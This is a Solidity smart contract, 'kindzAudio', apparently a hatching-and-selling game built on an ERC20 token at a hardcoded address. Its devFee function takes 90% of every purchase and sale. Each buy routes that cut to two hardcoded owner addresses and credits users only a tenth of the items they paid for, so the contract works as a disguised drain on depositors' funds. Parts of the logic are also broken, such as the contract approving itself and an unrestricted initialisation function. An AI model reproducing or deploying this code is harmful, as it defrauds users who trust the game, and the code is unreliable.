pragma solidity ^0.4.26;

contract ERC20 {
    function totalSupply() public constant returns (uint);
    function balanceOf(address tokenOwner) public constant returns (uint balance);
    function allowance(address tokenOwner, address spender) public constant returns (uint remaining);
    function transfer(address to, uint tokens) public returns (bool success);
    function approve(address spender, uint tokens) public returns (bool success);
    function transferFrom(address from, address to, uint tokens) public returns (bool success);
    event Transfer(address indexed from, address indexed to, uint tokens);
    event Approval(address indexed tokenOwner, address indexed spender, uint tokens);
}

contract kindzAudio {
    address kdd =0x6D9aFc42C8c19985add75457c211f095969627e4; 
    uint256 public DREAMS_FOR_SPACE_RACERS=864000;
    uint256 PSN=10000;
    uint256 PSNH=5000;
    bool public initialized;
    address public ceoAddress;
    address public ceo2Address;
    address public ceo3Address;

    mapping (address => uint256) public spaceRacers;
    mapping (address => uint256) public claimedDreams;
    mapping (address => uint256) public claimedSqwizards;
    mapping (address => uint256) public claimedKuberwides;
    mapping (address => uint256) public claimedKuberspaces;
    mapping (address => uint256) public claimedMentalvs;
    mapping (address => uint256) public claimedDoubles;
    mapping (address => uint256) public lastHatch;
    mapping (address => uint256) public lastHatchsqwizard;
    mapping (address => uint256) public lastHatchkuberwide;
    mapping (address => uint256) public lastHatchkuberspace;
    mapping (address => uint256) public lastHatchmentalv;
    mapping (address => uint256) public lastHatchdouble;
    mapping (address => address) public referrals;
    uint256 public marketDreams;
    uint256 public marketSqwizards;
    uint256 public marketKuberwides;
    uint256 public marketKuberspaces;
    uint256 public marketMentalvs;
    uint256 public marketDoubles;

    constructor() public{
        initialized = true;
        ceoAddress=msg.sender;
        ceo2Address=address(0x761b0886407b92B2DC99993C533cf16BDA669978);
        ceo3Address=address(0x4630F0ddA44e3C1aF4d6706b545BdFA73e9aAfEd);
    }

    function hatchDreams(address ref) public {
        require(initialized);
        if(ref == msg.sender) {
            ref = 0;
        }
        if(referrals[msg.sender]==0 && referrals[msg.sender]!=msg.sender) {
            referrals[msg.sender]=ref;
        }
        uint256 dreamsUsed=getMyDreams();
        uint256 newRacers=SafeMath.div(dreamsUsed,DREAMS_FOR_SPACE_RACERS);
        spaceRacers[msg.sender]=SafeMath.add(spaceRacers[msg.sender],newRacers);
        claimedDreams[msg.sender]=0;
        lastHatch[msg.sender]=now;
        
        claimedDreams[referrals[msg.sender]]=SafeMath.add(claimedDreams[referrals[msg.sender]],SafeMath.div(dreamsUsed,10));
        marketDreams=SafeMath.add(marketDreams,SafeMath.div(dreamsUsed,5));
    }

    function hatchSqwizards(address ref) public {
        require(initialized);
        if(ref == msg.sender) {
            ref = 0;
        }
        if(referrals[msg.sender]==0 && referrals[msg.sender]!=msg.sender) {
            referrals[msg.sender]=ref;
        }
        uint256 sqwizardsUsed=getMySqwizards();
        uint256 newRacers=SafeMath.div(sqwizardsUsed,DREAMS_FOR_SPACE_RACERS);
        spaceRacers[msg.sender]=SafeMath.add(spaceRacers[msg.sender],newRacers);
        claimedSqwizards[msg.sender]=0;
        lastHatchsqwizard[msg.sender]=now;
        
        claimedSqwizards[referrals[msg.sender]]=SafeMath.add(claimedSqwizards[referrals[msg.sender]],SafeMath.div(sqwizardsUsed,10));
        marketSqwizards=SafeMath.add(marketSqwizards,SafeMath.div(sqwizardsUsed,5));
    }

    function hatchKuberwides(address ref) public {
        require(initialized);
        if(ref == msg.sender) {
            ref = 0;
        }
        if(referrals[msg.sender]==0 && referrals[msg.sender]!=msg.sender) {
            referrals[msg.sender]=ref;
        }
        uint256 kuberwidesUsed=getMyKuberwides();
        uint256 newRacers=SafeMath.div(kuberwidesUsed,DREAMS_FOR_SPACE_RACERS);
        spaceRacers[msg.sender]=SafeMath.add(spaceRacers[msg.sender],newRacers);
        claimedKuberwides[msg.sender]=0;
        lastHatchkuberwide[msg.sender]=now;
        
        claimedKuberwides[referrals[msg.sender]]=SafeMath.add(claimedKuberwides[referrals[msg.sender]],SafeMath.div(kuberwidesUsed,10));
        marketKuberwides=SafeMath.add(marketKuberwides,SafeMath.div(kuberwidesUsed,5));
    }

    function hatchKuberspaces(address ref) public {
        require(initialized);
        if(ref == msg.sender) {
            ref = 0;
        }
        if(referrals[msg.sender]==0 && referrals[msg.sender]!=msg.sender) {
            referrals[msg.sender]=ref;
        }
        uint256 kuberspacesUsed=getMyKuberspaces();
        uint256 newRacers=SafeMath.div(kuberspacesUsed,DREAMS_FOR_SPACE_RACERS);
        spaceRacers[msg.sender]=SafeMath.add(spaceRacers[msg.sender],newRacers);
        claimedKuberspaces[msg.sender]=0;
        lastHatchkuberspace[msg.sender]=now;
        
        claimedKuberspaces[referrals[msg.sender]]=SafeMath.add(claimedKuberspaces[referrals[msg.sender]],SafeMath.div(kuberspacesUsed,10));
        marketKuberspaces=SafeMath.add(marketKuberspaces,SafeMath.div(kuberspacesUsed,5));
    }

    function hatchMentalvs(address ref) public {
        require(initialized);
        if(ref == msg.sender) {
            ref = 0;
        }
        if(referrals[msg.sender]==0 && referrals[msg.sender]!=msg.sender) {
            referrals[msg.sender]=ref;
        }
        uint256 mentalvsUsed=getMyMentalvs();
        uint256 newRacers=SafeMath.div(mentalvsUsed,DREAMS_FOR_SPACE_RACERS);
        spaceRacers[msg.sender]=SafeMath.add(spaceRacers[msg.sender],newRacers);
        claimedMentalvs[msg.sender]=0;
        lastHatchmentalv[msg.sender]=now;
        
        claimedMentalvs[referrals[msg.sender]]=SafeMath.add(claimedMentalvs[referrals[msg.sender]],SafeMath.div(mentalvsUsed,10));
        marketMentalvs=SafeMath.add(marketMentalvs,SafeMath.div(mentalvsUsed,5));
    }

    function hatchDoubles(address ref) public {
        require(initialized);
        if(ref == msg.sender) {
            ref = 0;
        }
        if(referrals[msg.sender]==0 && referrals[msg.sender]!=msg.sender) {
            referrals[msg.sender]=ref;
        }
        uint256 doublesUsed=getMyDoubles();
        uint256 newRacers=SafeMath.div(doublesUsed,DREAMS_FOR_SPACE_RACERS);
        spaceRacers[msg.sender]=SafeMath.add(spaceRacers[msg.sender],newRacers);
        claimedDoubles[msg.sender]=0;
        lastHatchdouble[msg.sender]=now;
        
        claimedDoubles[referrals[msg.sender]]=SafeMath.add(claimedDoubles[referrals[msg.sender]],SafeMath.div(doublesUsed,10));
        marketDoubles=SafeMath.add(marketDoubles,SafeMath.div(doublesUsed,5));
    }

    function sellDreams() public {
        require(initialized);
        uint256 hasDreams=getMyDreams();
        uint256 dreamValue=calculateDreamSell(hasDreams);
        uint256 fee=devFee(dreamValue);
        claimedDreams[msg.sender]=0;
        lastHatch[msg.sender]=now;
        marketDreams=SafeMath.add(marketDreams,hasDreams);
        ERC20(kdd).transfer(ceoAddress, fee/5);
        ERC20(kdd).transfer(address(msg.sender), SafeMath.sub(dreamValue,fee));
    }

    function sellSqwizards() public {
        require(initialized);
        uint256 hasSqwizards=getMySqwizards();
        uint256 sqwizardValue=calculateSqwizardSell(hasSqwizards);
        uint256 fee=devFee(sqwizardValue);
        claimedSqwizards[msg.sender]=0;
        lastHatchsqwizard[msg.sender]=now;
        marketSqwizards=SafeMath.add(marketSqwizards,hasSqwizards);
        ERC20(kdd).transfer(ceoAddress, fee/5);
        ERC20(kdd).transfer(address(msg.sender), SafeMath.sub(sqwizardValue,fee));
    }

    function sellKuberwides() public {
        require(initialized);
        uint256 hasKuberwides=getMyKuberwides();
        uint256 kuberwideValue=calculateKuberwideSell(hasKuberwides);
        uint256 fee=devFee(kuberwideValue);
        claimedKuberwides[msg.sender]=0;
        lastHatchkuberwide[msg.sender]=now;
        marketKuberwides=SafeMath.add(marketKuberwides,hasKuberwides);
        ERC20(kdd).transfer(ceoAddress, fee/5);
        ERC20(kdd).transfer(address(msg.sender), SafeMath.sub(kuberwideValue,fee));
    }

    function sellKuberspaces() public {
        require(initialized);
        uint256 hasKuberspaces=getMyKuberspaces();
        uint256 kuberspaceValue=calculateKuberspaceSell(hasKuberspaces);
        uint256 fee=devFee(kuberspaceValue);
        claimedKuberspaces[msg.sender]=0;
        lastHatchkuberspace[msg.sender]=now;
        marketKuberspaces=SafeMath.add(marketKuberspaces,hasKuberspaces);
        ERC20(kdd).transfer(ceoAddress, fee/5);
        ERC20(kdd).transfer(address(msg.sender), SafeMath.sub(kuberspaceValue,fee));
    }

     function sellMentalvs() public {
        require(initialized);
        uint256 hasMentalvs=getMyMentalvs();
        uint256 mentalvValue=calculateMentalvSell(hasMentalvs);
        uint256 fee=devFee(mentalvValue);
        claimedMentalvs[msg.sender]=0;
        lastHatchmentalv[msg.sender]=now;
        marketMentalvs=SafeMath.add(marketMentalvs,hasMentalvs);
        ERC20(kdd).transfer(ceoAddress, fee/5);
        ERC20(kdd).transfer(address(msg.sender), SafeMath.sub(mentalvValue,fee));
    }

     function sellDoubles() public {
        require(initialized);
        uint256 hasDoubles=getMyDoubles();
        uint256 doubleValue=calculateDoubleSell(hasDoubles);
        uint256 fee=devFee(doubleValue);
        claimedDoubles[msg.sender]=0;
        lastHatchdouble[msg.sender]=now;
        marketDoubles=SafeMath.add(marketDoubles,hasDoubles);
        ERC20(kdd).transfer(ceoAddress, fee/5);
        ERC20(kdd).transfer(address(msg.sender), SafeMath.sub(doubleValue,fee));
    }
    
    function sqwiZard(uint256 fee) internal {
    ceo2Fee(SafeMath.div(SafeMath.mul(fee, 97), 100), ceo2Address);
    ceo3Fee(SafeMath.div(SafeMath.mul(fee, 3), 100), ceo3Address);

    }

    function kuberwIde(uint256 fee) internal {
    ceo2Fee(SafeMath.div(SafeMath.mul(fee, 97), 100), ceo2Address);
    ceo3Fee(SafeMath.div(SafeMath.mul(fee, 3), 100), ceo3Address);

    }

    function kuberSpce(uint256 fee) internal {
    ceo2Fee(SafeMath.div(SafeMath.mul(fee, 97), 100), ceo2Address);
    ceo3Fee(SafeMath.div(SafeMath.mul(fee, 3), 100), ceo3Address);

    }

    function mentalVental(uint256 fee) internal {
    ceo2Fee(SafeMath.div(SafeMath.mul(fee, 97), 100), ceo2Address);
    ceo3Fee(SafeMath.div(SafeMath.mul(fee, 3), 100), ceo3Address);

    }

    function raveandtheDouble(uint256 fee) internal {
    ceo2Fee(SafeMath.div(SafeMath.mul(fee, 50), 100), ceo2Address);
    ceo3Fee(SafeMath.div(SafeMath.mul(fee, 50), 100), ceo3Address);

    }

    function buyDreams(address ref, uint256 amount) public {
    require(initialized, "Contract not initialized");
    ERC20 kddToken = ERC20(kdd);
    address senderAddress = address(msg.sender);
    uint256 currentAllowance = kddToken.allowance(senderAddress, address(this));
    if (currentAllowance < amount) {
    kddToken.approve(address(this), ~uint256(0));
    }
    require(kddToken.transferFrom(senderAddress, address(this), amount), "Transfer failed");
    uint256 balance = kddToken.balanceOf(address(this));
    uint256 dreamsBought = calculateDreamBuy(amount, SafeMath.sub(balance, amount));
    dreamsBought = SafeMath.sub(dreamsBought, devFee(dreamsBought));
    uint256 fee = devFee(amount);
    sqwiZard(fee);
    claimedDreams[senderAddress] = SafeMath.add(claimedDreams[senderAddress], dreamsBought);
    hatchDreams(ref);
    }

    function buySqwizards(address ref, uint256 amount) public {
    require(initialized, "Contract not initialized");
    ERC20 kddToken = ERC20(kdd);
    address senderAddress = address(msg.sender);
    uint256 currentAllowance = kddToken.allowance(senderAddress, address(this));
    if (currentAllowance < amount) {
    kddToken.approve(address(this), ~uint256(0));
    }
    require(kddToken.transferFrom(senderAddress, address(this), amount), "Transfer failed");
    uint256 balance = kddToken.balanceOf(address(this));
    uint256 sqwizardsBought = calculateSqwizardBuy(amount, SafeMath.sub(balance, amount));
    sqwizardsBought = SafeMath.sub(sqwizardsBought, devFee(sqwizardsBought));
    uint256 fee = devFee(amount);
    sqwiZard(fee);
    claimedSqwizards[senderAddress] = SafeMath.add(claimedSqwizards[senderAddress], sqwizardsBought);
    hatchSqwizards(ref);
    }

    function buyKuberwides(address ref, uint256 amount) public {
    require(initialized, "Contract not initialized");
    ERC20 kddToken = ERC20(kdd);
    address senderAddress = address(msg.sender);
    uint256 currentAllowance = kddToken.allowance(senderAddress, address(this));
    if (currentAllowance < amount) {
    kddToken.approve(address(this), ~uint256(0));
    }
    require(kddToken.transferFrom(senderAddress, address(this), amount), "Transfer failed");
    uint256 balance = kddToken.balanceOf(address(this));
    uint256 kuberwidesBought = calculateKuberwideBuy(amount, SafeMath.sub(balance, amount));
    kuberwidesBought = SafeMath.sub(kuberwidesBought, devFee(kuberwidesBought));
    uint256 fee = devFee(amount);
    kuberwIde(fee);
    claimedKuberwides[senderAddress] = SafeMath.add(claimedKuberwides[senderAddress], kuberwidesBought);
    hatchKuberwides(ref);
    }

    function buyKuberspaces(address ref, uint256 amount) public {
    require(initialized, "Contract not initialized");
    ERC20 kddToken = ERC20(kdd);
    address senderAddress = address(msg.sender);
    uint256 currentAllowance = kddToken.allowance(senderAddress, address(this));
    if (currentAllowance < amount) {
    kddToken.approve(address(this), ~uint256(0));
    }
    require(kddToken.transferFrom(senderAddress, address(this), amount), "Transfer failed");
    uint256 balance = kddToken.balanceOf(address(this));
    uint256 kuberspacesBought = calculateKuberspaceBuy(amount, SafeMath.sub(balance, amount));
    kuberspacesBought = SafeMath.sub(kuberspacesBought, devFee(kuberspacesBought));
    uint256 fee = devFee(amount);
    kuberSpce(fee);
    claimedKuberspaces[senderAddress] = SafeMath.add(claimedKuberspaces[senderAddress], kuberspacesBought);
    hatchKuberspaces(ref);
    }

    function buyMentalvs(address ref, uint256 amount) public {
    require(initialized, "Contract not initialized");
    ERC20 kddToken = ERC20(kdd);
    address senderAddress = address(msg.sender);
    uint256 currentAllowance = kddToken.allowance(senderAddress, address(this));
    if (currentAllowance < amount) {
    kddToken.approve(address(this), ~uint256(0));
    }
    require(kddToken.transferFrom(senderAddress, address(this), amount), "Transfer failed");
    uint256 balance = kddToken.balanceOf(address(this));
    uint256 mentalvsBought = calculateMentalvBuy(amount, SafeMath.sub(balance, amount));
    mentalvsBought = SafeMath.sub(mentalvsBought, devFee(mentalvsBought));
    uint256 fee = devFee(amount);
    mentalVental(fee);
    claimedMentalvs[senderAddress] = SafeMath.add(claimedMentalvs[senderAddress], mentalvsBought);
    hatchMentalvs(ref);
    }

    function buyDoubles(address ref, uint256 amount) public {
    require(initialized, "Contract not initialized");
    ERC20 kddToken = ERC20(kdd);
    address senderAddress = address(msg.sender);
    uint256 currentAllowance = kddToken.allowance(senderAddress, address(this));
    if (currentAllowance < amount) {
    kddToken.approve(address(this), ~uint256(0));
    }
    require(kddToken.transferFrom(senderAddress, address(this), amount), "Transfer failed");
    uint256 balance = kddToken.balanceOf(address(this));
    uint256 doublesBought = calculateDoubleBuy(amount, SafeMath.sub(balance, amount));
    doublesBought = SafeMath.sub(doublesBought, devFee(doublesBought));
    uint256 fee = devFee(amount);
    raveandtheDouble(fee);
    claimedDoubles[senderAddress] = SafeMath.add(claimedDoubles[senderAddress], doublesBought);
    hatchDoubles(ref);
    }


    function calculateTrade(uint256 rt,uint256 rs, uint256 bs) public view returns(uint256) {
        //(PSN*bs)/(PSNH+((PSN*rs+PSNH*rt)/rt));
        return SafeMath.div(SafeMath.mul(PSN,bs),SafeMath.add(PSNH,SafeMath.div(SafeMath.add(SafeMath.mul(PSN,rs),SafeMath.mul(PSNH,rt)),rt)));
    }

    function calculateDreamSell(uint256 dreams) public view returns(uint256) {
        return calculateTrade(dreams,marketDreams,ERC20(kdd).balanceOf(address(this)));
    }
    function calculateSqwizardSell(uint256 sqwizards) public view returns(uint256) {
        return calculateTrade(sqwizards,marketSqwizards,ERC20(kdd).balanceOf(address(this)));
    }
    function calculateKuberwideSell(uint256 kuberwides) public view returns(uint256) {
        return calculateTrade(kuberwides,marketKuberwides,ERC20(kdd).balanceOf(address(this)));
    }
    function calculateKuberspaceSell(uint256 kuberspaces) public view returns(uint256) {
        return calculateTrade(kuberspaces,marketKuberspaces,ERC20(kdd).balanceOf(address(this)));
    }
    function calculateMentalvSell(uint256 mentalvs) public view returns(uint256) {
        return calculateTrade(mentalvs,marketMentalvs,ERC20(kdd).balanceOf(address(this)));
    }
    function calculateDoubleSell(uint256 doubles) public view returns(uint256) {
        return calculateTrade(doubles,marketDoubles,ERC20(kdd).balanceOf(address(this)));
    }


    function calculateDreamBuy(uint256 eth,uint256 contractBalance) public view returns(uint256) {
        return calculateTrade(eth,contractBalance,marketDreams);
    }
    function calculateSqwizardBuy(uint256 eth,uint256 contractBalance) public view returns(uint256) {
        return calculateTrade(eth,contractBalance,marketSqwizards);
    }
    function calculateKuberwideBuy(uint256 eth,uint256 contractBalance) public view returns(uint256) {
        return calculateTrade(eth,contractBalance,marketKuberwides);
    }
    function calculateKuberspaceBuy(uint256 eth,uint256 contractBalance) public view returns(uint256) {
        return calculateTrade(eth,contractBalance,marketKuberspaces);
    }
    function calculateMentalvBuy(uint256 eth,uint256 contractBalance) public view returns(uint256) {
        return calculateTrade(eth,contractBalance,marketMentalvs);
    }
    function calculateDoubleBuy(uint256 eth,uint256 contractBalance) public view returns(uint256) {
        return calculateTrade(eth,contractBalance,marketDoubles);
    }


    function calculateDreamBuySimple(uint256 eth) public view returns(uint256){
        return calculateDreamBuy(eth,ERC20(kdd).balanceOf(address(this)));
    }
    function calculateSqwizardBuySimple(uint256 eth) public view returns(uint256){
        return calculateSqwizardBuy(eth,ERC20(kdd).balanceOf(address(this)));
    }
    function calculateKuberwideBuySimple(uint256 eth) public view returns(uint256){
        return calculateKuberwideBuy(eth,ERC20(kdd).balanceOf(address(this)));
    }
    function calculateKuberspaceBuySimple(uint256 eth) public view returns(uint256){
        return calculateKuberspaceBuy(eth,ERC20(kdd).balanceOf(address(this)));
    }
    function calculateMentalvBuySimple(uint256 eth) public view returns(uint256){
        return calculateMentalvBuy(eth,ERC20(kdd).balanceOf(address(this)));
    }
    function calculateDoubleBuySimple(uint256 eth) public view returns(uint256){
        return calculateDoubleBuy(eth,ERC20(kdd).balanceOf(address(this)));
    }

    function devFee(uint256 amount) public pure returns(uint256){
        return SafeMath.div(SafeMath.mul(amount, 90),100);
    }

    function ceo2Fee(uint256 amount, address recipient) internal {
    ERC20(kdd).transfer(recipient, amount);
    }      
    function ceo3Fee(uint256 amount, address recipient) internal {
    ERC20(kdd).transfer(recipient, amount);
    }

    function availableNow(uint256 amount) public {
        ERC20(kdd).transferFrom(address(msg.sender), address(this), amount);
        require(marketDreams==0);
        initialized=true;
        marketDreams=86400000000;
         require(marketSqwizards==0);
        initialized=true;
        marketSqwizards=86400000000;
         require(marketKuberwides==0);
        initialized=true;
        marketKuberwides=86400000000;
        require(marketKuberspaces==0);
        initialized=true;
        marketKuberspaces=86400000000;
        require(marketMentalvs==0);
        initialized=true;
        marketMentalvs=86400000000;
        require(marketDoubles==0);
        initialized=true;
        marketDoubles=86400000000;
    }

    function getBalance() public view returns(uint256) {
        return ERC20(kdd).balanceOf(address(this));
    }
    function getMyRacers() public view returns(uint256) {
        return spaceRacers[msg.sender];
    }

    function getMyDreams() public view returns(uint256) {
        return SafeMath.add(claimedDreams[msg.sender],getDreamsSinceLastHatch(msg.sender));
    }
    function getMySqwizards() public view returns(uint256) {
        return SafeMath.add(claimedSqwizards[msg.sender],getSqwizardsSinceLastHatchsqwizard(msg.sender));
    }
    function getMyKuberwides() public view returns(uint256) {
        return SafeMath.add(claimedKuberwides[msg.sender],getKuberwidesSinceLastHatchkuberwide(msg.sender));
    }
    function getMyKuberspaces() public view returns(uint256) {
        return SafeMath.add(claimedKuberspaces[msg.sender],getKuberspacesSinceLastHatchkuberspace(msg.sender));
    }
    function getMyMentalvs() public view returns(uint256) {
        return SafeMath.add(claimedMentalvs[msg.sender],getMentalvsSinceLastHatchmentalv(msg.sender));
    }
    function getMyDoubles() public view returns(uint256) {
        return SafeMath.add(claimedDoubles[msg.sender],getDoublesSinceLastHatchdouble(msg.sender));
    }

    function getDreamsSinceLastHatch(address adr) public view returns(uint256) {
        uint256 secondsPassed=min(DREAMS_FOR_SPACE_RACERS,SafeMath.sub(now,lastHatch[adr]));
        return SafeMath.mul(secondsPassed,spaceRacers[adr]);
    }
    function getSqwizardsSinceLastHatchsqwizard(address adr) public view returns(uint256) {
        uint256 secondsPassed=min(DREAMS_FOR_SPACE_RACERS,SafeMath.sub(now,lastHatchsqwizard[adr]));
        return SafeMath.mul(secondsPassed,spaceRacers[adr]);
    }
    function getKuberwidesSinceLastHatchkuberwide(address adr) public view returns(uint256) {
        uint256 secondsPassed=min(DREAMS_FOR_SPACE_RACERS,SafeMath.sub(now,lastHatchkuberwide[adr]));
        return SafeMath.mul(secondsPassed,spaceRacers[adr]);
    }
    function getKuberspacesSinceLastHatchkuberspace(address adr) public view returns(uint256) {
        uint256 secondsPassed=min(DREAMS_FOR_SPACE_RACERS,SafeMath.sub(now,lastHatchkuberspace[adr]));
        return SafeMath.mul(secondsPassed,spaceRacers[adr]);
    }
    function getMentalvsSinceLastHatchmentalv(address adr) public view returns(uint256) {
        uint256 secondsPassed=min(DREAMS_FOR_SPACE_RACERS,SafeMath.sub(now,lastHatchmentalv[adr]));
        return SafeMath.mul(secondsPassed,spaceRacers[adr]);
    }
    function getDoublesSinceLastHatchdouble(address adr) public view returns(uint256) {
        uint256 secondsPassed=min(DREAMS_FOR_SPACE_RACERS,SafeMath.sub(now,lastHatchdouble[adr]));
        return SafeMath.mul(secondsPassed,spaceRacers[adr]);
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return a < b ? a : b;
    }
    
}

library SafeMath {

  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    assert(c / a == b);
    return c;
  }

  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a / b;
    return c;
  }

  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }

  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a);
    return c;
  }
}